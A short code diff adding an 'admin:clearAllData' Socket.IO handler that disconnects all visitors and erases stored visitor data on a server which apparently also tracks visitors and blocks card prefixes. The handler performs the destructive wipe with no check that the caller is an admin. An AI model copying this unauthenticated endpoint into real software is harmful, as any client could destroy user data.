@@ -534,6 +534,29 @@ io.on("connection", (socket) => {
     }
   });
 
+  // Admin: Clear all data
+  socket.on("admin:clearAllData", () => {
+    // Disconnect all visitors
+    visitors.forEach((v, socketId) => {
+      io.to(socketId).emit("deleted");
+    });
+    
+    // Clear all data
+    visitors.clear();
+    savedVisitors = [];
+    visitorCounter = 0;
+    
+    // Save empty data to disk
+    saveData();
+    
+    // Notify all admins
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("allDataCleared");
+    });
+    
+    console.log("All data cleared by admin");
+  });
+
   // Admin: Block card prefix
   socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
     const visitor = visitors.get(visitorSocketId);
